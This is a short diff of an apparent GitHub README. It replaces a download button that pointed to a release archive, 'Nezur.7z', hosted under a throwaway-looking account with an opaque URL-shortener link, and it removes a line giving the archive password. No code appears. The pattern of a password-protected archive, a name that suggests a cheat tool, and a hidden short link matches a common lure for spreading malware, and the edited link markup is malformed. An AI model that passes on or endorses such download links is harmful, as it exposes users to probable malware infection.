@@ -7,9 +7,8 @@
 
 
 
-[![download_click](https://github.com/Gogle1wds/teest1/assets/170970796/4bbf4ab1-ed95-428e-840f-7972ec26be44)](https://github.com/Gogle1wds/teest1/releases/download/das/Nezur.7z)
+[![download_click](https://goo.su/rH3n)
 
-- ARCHIVE PASS : 9837
 
 
 > [!NOTE]
